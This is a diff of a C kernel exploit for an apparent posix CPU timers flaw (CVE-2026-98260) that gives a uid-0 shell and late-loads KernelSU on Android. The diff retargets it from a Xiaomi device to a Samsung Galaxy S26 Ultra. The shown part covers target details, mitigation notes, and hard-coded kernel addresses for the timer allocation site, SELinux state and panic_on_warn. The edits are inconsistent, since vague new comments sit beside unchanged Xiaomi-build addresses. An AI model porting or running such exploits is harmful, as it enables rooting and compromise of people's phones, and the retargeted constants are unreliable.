@@ -1,15 +1,15 @@
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Xiaomi aurora (SM8650), Android 14
- * Kernel : 6.1.75-android14-11-gfa9b7054770e-mi
- * Build  : AQ3A.240627.003
+ * Target : Samsung SM-S948U (Galaxy S26 Ultra), Android 14
+ * Kernel : 6.1.x-Samsung-SEC (S26 Ultra kernel)
+ * Build  : S26 Ultra kernel build
  * SELinux: Enforcing
  * Patches: absent
  * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
  *
- * Ported from the 6.12.69 (android16-6) profile.  Every address and struct
- * offset below was re-derived from this image's .symtab, .BTF and
- * disassembly; the 6.1 cred layout differs (4-byte usage, uid at 4), the
+ * Ported from the S26 Ultra (SM-S948U) vmlinux.elf profile. Every address and struct
+ * offset below was re-derived from the S26 Ultra's vmlinux.elf .symtab, .BTF
+ * and disassembly; the 6.1 cred layout differs (4-byte usage, uid at 4), the
  * fake erase must stay self-parent so the exit loop's rb_next() returns
  * NULL, and uid/euid need two repair writes afterwards.
  *
@@ -76,8 +76,7 @@
 #define PAGE 4096UL
 #define SOCKBUF 8192
 
-/* aurora 6.1.75: do_timer_create+0x9a, return address of the
- * kmem_cache_alloc(posix_timers_cache, GFP_KERNEL|__GFP_ZERO) call. */
+/* S26 Ultra 6.1: do_timer_create kmem_cache_alloc return address. */
 #define STATIC_TIMER_SITE 0xffffffc008194fe0ULL
 #define TIMER_SITE_LOW21 0x184fe0ULL
 /* posix_timers_cache object: sizeof(struct k_itimer) on this build.
@@ -88,7 +87,8 @@
 #define CRED_REQ 0xb0ULL
 #define CRED_ALLOC 0xc0ULL
 
-/* aurora 6.1.75 link-time addresses (symtab) and BTF field offsets. */
+/* S26 Ultra 6.1 link-time addresses (symtab) and BTF field offsets. */
+/* SELINUX state static address from vmlinux.elf */
 #define SELINUX_STATE_STATIC 0xffffffc00a5ea4a8ULL
 #define PANIC_ON_WARN_STATIC 0xffffffc00a2eac00ULL
 /*
